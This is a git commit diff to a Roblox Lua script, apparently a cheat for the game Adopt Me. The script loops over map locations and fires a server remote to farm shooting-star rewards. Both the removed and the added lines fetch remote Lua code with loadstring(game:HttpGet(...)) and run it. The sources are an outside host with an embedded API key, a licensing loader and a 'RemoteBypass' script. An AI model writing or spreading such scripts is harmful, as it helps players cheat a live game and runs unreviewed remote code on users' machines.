d9f99f3a66cd2eafae94a8de6faaf510f9a8d53d
greg66n <darien95sm@hotmail.com>
2025-01-24 13:42:14 -0800

    Update adopt1.lua

--- adopt1.lua
+++ adopt1.lua
@@ -1,26 +1,4 @@
-wait(1)
-local locations = {"Neighborhood", "MainMap"}
 
-while true do  -- loop infinitely
-    for i = 1, 100 do
-        for _, location in ipairs(locations) do
-            local args = {
-                [1] = location,
-                [2] = tostring(i)
-            }
-            game:GetService("ReplicatedStorage").API:FindFirstChild("MoonAPI/ShootingStarCollected"):FireServer(unpack(args))
-            wait(0.5)  -- 0.5 second delay prevent crash.. don't remove this to execute faster
-        end
-    end
-    wait(43200)  -- loop every 12h
-end
-
-task.spawn(function()
-    task.wait(35)
-    getgenv().API_KEY = "pQP1Ma1WE4h81mPToP54"
-    loadstring(game:HttpGet("http://ii.sebas.sbs:4241/adoptme/dashboard.lua"))()
-end)
-wait(1)
 
 task.spawn(function()
    -- ARCEUS, CODEX ETC
@@ -36,4 +14,22 @@ getgenv().Config = {
 }
 loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/66567bfd337b57eb059b58dbe1badb89.lua"))()
 end)
+wait(1)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Xenijo/AdoptMe-RemoteBypass/main/Bypass.lua"))()
+wait(1)
+local locations = {"Neighborhood", "MainMap","SkyCastle"}
+
+while true do  -- loop infinitely
+    for i = 1, 100 do
+        for _, location in ipairs(locations) do
+            local args = {
+                [1] = location,
+                [2] = tostring(i)
+            }
+            game:GetService("ReplicatedStorage").API:FindFirstChild("MoonAPI/ShootingStarCollected"):FireServer(unpack(args))
+            wait(0.5)  -- 0.5 second delay prevent crash.. don't remove this to execute faster
+        end
+    end
+    wait(43200)  -- loop every 12h
+end
 
